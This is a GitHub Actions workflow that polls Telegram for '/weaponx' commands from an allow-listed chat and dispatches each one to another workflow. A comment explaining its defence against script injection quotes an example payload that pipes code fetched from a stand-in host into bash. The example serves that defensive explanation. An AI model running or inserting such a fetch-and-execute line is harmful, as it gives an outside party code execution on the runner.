name: PUSH poll (cold-start command intake)

# Cold-start path for PUSH: lets the operator kick off a brand-new weaponx task
# from their phone when NO local session is running. It polls Telegram for new
# "/weaponx <task>" messages from the single allow-listed chat id, and when it
# finds one, triggers push-dispatch.yml to actually run the loop.
#
# HONEST CAVEAT: GitHub's `schedule:` trigger is best-effort, not exact-time. Cron
# here is "at most every ~5 minutes"; under load GitHub can delay or occasionally
# skip runs, and scheduled workflows on the default branch can be disabled after
# ~60 days of repo inactivity. That latency/unreliability is an ACCEPTED tradeoff
# for a cold-start convenience path — it is not the primary way to run weaponx, and
# it is not a bug to be fixed here. When a local session is running, use the Path 1
# long-poll bridge instead, which is immediate.

on:
  schedule:
    # Every 5 minutes (best-effort — see caveat above).
    - cron: "*/5 * * * *"
  workflow_dispatch: {}   # allow manual "poll now" for testing

# Never run two pollers at once — overlapping polls could double-dispatch the same
# command because Telegram's getUpdates offset is advanced per-run, not shared.
concurrency:
  group: push-poll
  cancel-in-progress: false

permissions:
  actions: write   # needed to trigger push-dispatch.yml via the API
  contents: read

jobs:
  poll:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout (for the offset cache key only)
        uses: actions/checkout@v4

      # Persist the last-processed Telegram update_id between runs so we don't
      # re-dispatch a command we already saw. Cache is best-effort; if it misses,
      # we fall back to only processing the newest single command (see below).
      - name: Restore last-seen update offset
        id: offset-cache
        uses: actions/cache@v4
        with:
          path: .push-offset
          key: push-telegram-offset-${{ github.run_id }}
          restore-keys: |
            push-telegram-offset-

      - name: Poll Telegram for new /weaponx commands
        id: poll
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          set -euo pipefail

          if [ -z "${TELEGRAM_BOT_TOKEN}" ] || [ -z "${TELEGRAM_CHAT_ID}" ]; then
            echo "PUSH secrets not set — nothing to poll. (This workflow is inert until configured.)"
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          OFFSET=0
          if [ -f .push-offset ]; then
            OFFSET="$(cat .push-offset)"
          fi

          RESP="$(curl -sS -X POST \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates" \
            --data-urlencode "offset=${OFFSET}" \
            --data-urlencode "timeout=0" \
            --data-urlencode 'allowed_updates=["message"]')"

          if [ "$(echo "$RESP" | jq -r '.ok')" != "true" ]; then
            # A real Telegram API error (bad token, rate limit, a webhook
            # conflict like the one that silently broke this workflow for an
            # extended period — see LEARNING.md, 2026-08-07) is not the same
            # outcome as "polled fine, nothing new to dispatch". Exiting 0
            # here made every failure look identical to success in the
            # Actions tab; exit non-zero instead so the run shows red and is
            # actually visible, while "secrets not set" and "no new command"
            # below stay clean, successful exits — those are real no-ops.
            echo "Telegram getUpdates error: $(echo "$RESP" | jq -r '.description // "unknown"')" >&2
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 5
          fi

          # Advance the offset past everything we fetched, so the next run starts fresh.
          LAST="$(echo "$RESP" | jq -r '.result | (map(.update_id) | max) // empty')"
          if [ -n "$LAST" ]; then
            echo "$(( LAST + 1 ))" > .push-offset
          fi

          # Find EVERY message from the allow-listed chat that starts with
          # "/weaponx " in this poll window, not just the newest. Taking only
          # `last` used to mean: if two /weaponx commands landed in the same
          # ~5-minute poll window, the older one was silently and permanently
          # dropped — its update_id is still covered by the offset advance
          # above, so Telegram never returns it again, and nothing ever
          # notified the operator it went missing. Verified by running this
          # exact filter against a synthetic two-command payload before
          # fixing it (see LEARNING.md, 2026-08-07). Emitted as a compact
          # (single-line) JSON array, oldest first — jq -c guarantees no
          # literal newlines in the output, so this is $GITHUB_OUTPUT-safe
          # without needing a heredoc.
          TASKS_JSON="$(echo "$RESP" | jq -c \
            --arg chat "${TELEGRAM_CHAT_ID}" '
            [ .result[]
              | select(.message.chat.id|tostring == $chat)
              | select(.message.text != null)
              | select(.message.text | startswith("/weaponx "))
              | (.message.text | sub("^/weaponx "; ""))
            ]
          ')"
          TASK_COUNT="$(echo "$TASKS_JSON" | jq 'length')"

          if [ "$TASK_COUNT" -eq 0 ]; then
            echo "No new /weaponx command from the allow-listed chat this poll."
            echo "dispatch=false" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          echo "Found ${TASK_COUNT} command(s) this poll; will dispatch each in order (oldest first)."
          echo "dispatch=true" >> "$GITHUB_OUTPUT"
          echo "tasks=${TASKS_JSON}" >> "$GITHUB_OUTPUT"

      - name: Trigger dispatch workflow
        if: steps.poll.outputs.dispatch == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # Routed through env:, not interpolated directly into the script below.
          # Task text comes from a Telegram message — untrusted content, even
          # though only the allow-listed chat can send it. Direct ${{ }}
          # interpolation into a run: block is literal text substitution before
          # bash ever parses it — the classic GitHub Actions script-injection
          # pattern (a task like `"; curl evil.sh | bash #` would execute on the
          # runner with this job's actions:write permissions, not just become
          # task text). env: + "$TASK_TEXT" avoids that; bash does not re-parse
          # an expanded variable's contents for further substitution.
          TASKS_JSON: ${{ steps.poll.outputs.tasks }}
        run: |
          set -euo pipefail
          # Dispatch every command found this poll, oldest first. Each call
          # triggers a separate push-dispatch.yml run; push-dispatch.yml's own
          # `concurrency: group: push-dispatch` (cancel-in-progress: false)
          # queues them to run one at a time rather than in parallel — that
          # concurrency group is what turns "dispatch all of them" into a safe
          # queue instead of N simultaneous headless runs.
          echo "$TASKS_JSON" | jq -r '.[]' | while IFS= read -r TASK_TEXT; do
            gh workflow run push-dispatch.yml \
              --ref "${{ github.ref_name }}" \
              -f task="$TASK_TEXT"
            echo "Dispatched push-dispatch.yml with task: ${TASK_TEXT}"
          done
